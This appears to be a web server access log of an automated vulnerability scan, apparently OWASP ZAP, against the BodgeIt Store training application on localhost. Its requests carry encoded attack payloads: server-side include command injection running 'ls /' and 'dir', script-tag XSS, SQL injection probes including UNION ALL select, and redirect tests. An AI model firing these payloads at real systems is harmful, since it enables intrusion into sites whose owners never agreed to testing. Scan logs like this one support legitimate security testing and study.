127.0.0.1 - - [01/Apr/2017:12:03:46 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:46 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:46 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=www.google.com%2F HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=www.google.com%3A80%2F HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=www.google.com HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:47 +1300] "GET /bodgeit/product.jsp?prodid=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:48 +1300] "GET /bodgeit/product.jsp?typeid=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:48 +1300] "GET /bodgeit/product.jsp?typeid=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:48 +1300] "GET /bodgeit/product.jsp?typeid=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:48 +1300] "GET /bodgeit/product.jsp?typeid=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:48 +1300] "GET /bodgeit/product.jsp?prodid=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:49 +1300] "GET /bodgeit/product.jsp?prodid=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:49 +1300] "GET /bodgeit/product.jsp?prodid=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:49 +1300] "GET /bodgeit/product.jsp?prodid=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?typeid=0W45pz4p HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?typeid=10W45pz4p HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?typeid=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?prodid=0W45pz4p HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?prodid=110W45pz4p HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:50 +1300] "GET /bodgeit/product.jsp?prodid=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%27 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%22 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%3B HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%29 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1 HTTP/1.1" 200 2784
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=3-2 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1 HTTP/1.1" 200 2784
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1+AND+1%3D1+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1+AND+1%3D1 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%27+AND+%271%27%3D%271 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%22+AND+%221%22%3D%221 HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
127.0.0.1 - - [01/Apr/2017:12:03:52 +1300] "GET /bodgeit/product.jsp?typeid=1%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 2313
